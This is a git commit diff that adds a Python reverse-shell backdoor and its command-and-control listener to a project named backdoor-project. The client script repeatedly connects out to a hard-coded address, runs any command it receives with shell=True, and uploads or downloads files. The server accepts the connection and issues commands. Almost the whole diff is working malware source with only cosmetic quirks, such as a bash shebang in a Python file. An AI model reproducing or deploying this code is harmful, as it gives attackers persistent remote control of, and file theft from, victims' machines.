41405d234ea2622fd408205d9d7c5d9ec2982060
tylerkain <tyler.kain@outlook.com>
2023-02-11 20:11:39 -0600

    feat: created shell project

--- backdoor-project/backdoor.py
+++ backdoor-project/backdoor.py
@@ -1,35 +1,74 @@
+#!bin/bash
 import socket
-ip_addr = input("IP Address of target >>> ")
-port = int(input("port to listen >>> "))
+import time
+import subprocess
+import json
+import os
 
 def reliable_send(data):
-    json_data = json.dumps(data)
-    s.send(json_data.encode())
+        jsondata = json.dumps(data)
+        s.send(jsondata.encode())
 
 def reliable_recv():
-    data=''
-    while True:
-        try:
-            data = data + target.recv(1024).decode().rstrip()
-            return json.loads(data)
-        except ValueError:
-            continue
+        data = ''
+        while True:
+                try:
+                        data = data + s.recv(1024).decode().rstrip()
+                        return json.loads(data)
+                except ValueError:
+                        continue
+
+
+
 
 def connection():
-    while True:
-        time.sleep(20)
-        try: 
-            s.connect((ip_addr, port))
-            shell()
-            s.close()
-        except:
-            connection()
+	while True:
+		time.sleep(20)
+		try:
+			s.connect(('192.168.223.133',5555))
+			shell()
+			s.close()
+			break
+		except:
+			connection()
+
+def upload_file(file_name):
+	f = open(file_name, 'rb')
+	s.send(f.read())
+
+
+def download_file(file_name):
+        f = open(file_name, 'wb')
+        s.settimeout(1)
+        chunk = s.recv(1024)
+        while chunk:
+                f.write(chunk)
+                try:
+                        chunk = s.recv(1024)
+                except socket.timeout as e:
+                        break
+        s.settimeout(None)
+        f.close()
+
 
 def shell():
-    while True:
-        command = reliable_recv()
-        if command == "quit" :
-            break
+	while True:
+		command = reliable_recv()
+		if command == 'quit':
+			break
+		elif command == 'clear':
+			pass
+		elif command[:3] == 'cd ':
+			os.chdir(command[3:])
+		elif command[:8] == 'download':
+			upload_file(command[9:])
+		elif command[:6] == 'upload':
+			download_file(command[7:])
+		else:
+			execute = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
+			result = execute.stdout.read() + execute.stderr.read()
+			result = result.decode()
+			reliable_send(result)
 
 s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 connection()
--- backdoor-project/server.py
+++ backdoor-project/server.py
@@ -1,41 +1,64 @@
-#!bin/bash
 import socket
 import json
+import os
+
 
 def reliable_send(data):
-    json_data = json.dumps(data)
-    target.send(json_data.encode())
+	jsondata = json.dumps(data)
+	target.send(jsondata.encode())
 
 def reliable_recv():
-    data=''
-    while True:
-        try:
-            data = data + target.recv(1024).decode().rstrip()
-            return json.loads(data)
-        except ValueError:
-            continue
+	data = ''
+	while True:
+		try:
+			data = data + target.recv(1024).decode().rstrip()
+			return json.loads(data)
+		except ValueError:
+			continue
+
+def upload_file(file_name):
+        f = open(file_name, 'rb')
+        target.send(f.read())
 
 
+def download_file(file_name):
+	f = open(file_name, 'wb')
+	target.settimeout(1)
+	chunk = target.recv(1024)
+	while chunk:
+		f.write(chunk)
+		try:
+			chunk = target.recv(1024)
+		except socket.timeout as e:
+			break
+	target.settimeout(None)
+	f.close()
 
-def target_communcation():
-    while True:
-        command = input(f'* Shell~%s: ' %{ip})
-        reliable_send(command)
-        if command == 'quit': 
-            break
-        else: 
-            result = reliable_recv()
-            print(result)
 
-ip_address = input("Type IP Address to Connect to >>> ")
-port = int(input("Type Port to Connect to >>"))
+def target_communication():
+	while True:
+		command = input('* Shell~%s: ' % str(ip))
+		reliable_send(command)
+		if command == 'quit':
+			break
+		elif command == 'clear':
+			os.system('clear')
+		elif command[:3] == 'cd ':
+			pass
+		elif command[:8] == 'download':
+			download_file(command[9:])
+		elif command[:6] == 'upload':
+			upload_file(command[7:])
+		else:
+			result = reliable_recv()
+			print(result)
+
 
 
 sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-sock.bind((ip_address, port ))
+sock.bind(('192.168.1.12', 5555))
+print('[+] Listening For The Incoming Connections')
 sock.listen(5)
 target, ip = sock.accept()
-
-print(f'Connected to: {ip}')
-
-target_communcation()
+print('[+] Target Connected From: ' + str(ip))
+target_communication()
